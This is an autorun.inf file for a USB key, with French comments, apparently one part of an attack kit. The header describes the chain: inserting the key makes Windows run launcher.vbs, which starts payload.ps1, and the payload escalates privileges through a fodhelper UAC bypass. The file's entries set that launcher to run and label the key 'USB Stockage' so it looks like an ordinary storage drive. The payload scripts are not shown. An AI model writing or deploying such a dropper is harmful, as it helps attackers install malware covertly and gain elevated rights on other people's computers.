; ============================================================
; autorun.inf – Déclencheur AutoRun pour clé USB
;
; Comportement attendu :
;   Insertion de la clé → Windows lit autorun.inf →
;   launcher.vbs s'exécute et lance payload.ps1.
;   Le payload s'élève automatiquement via UAC bypass (fodhelper)
;   depuis un compte utilisateur standard.
; ============================================================
[autorun]
open=launcher.vbs
icon=shell32.dll,8
label=USB Stockage
